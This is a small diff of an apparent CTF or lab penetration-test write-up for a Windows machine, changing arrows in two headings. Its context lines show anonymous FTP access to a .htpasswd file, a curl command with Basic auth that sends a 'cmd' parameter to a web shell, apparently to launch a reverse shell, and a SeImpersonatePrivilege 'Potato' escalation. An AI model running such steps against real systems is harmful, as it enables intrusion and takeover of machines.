@@ -37,7 +37,7 @@ PORT     STATE SERVICE    VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-### FTP Anonymous Access --> .htpasswd
+### FTP Anonymous Access -> .htpasswd
 
 The FTP service on port 21 accepts anonymous logins:
 
@@ -145,7 +145,7 @@ $ curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -G --data-urlencode 'cmd=.\rev
 
 ## Privilege Escalation
 
-### SeImpersoantePrivilege --> Potato
+### SeImpersoantePrivilege -> Potato
 
 This user had the `SeImpersonatePrivilege` enabled:
 
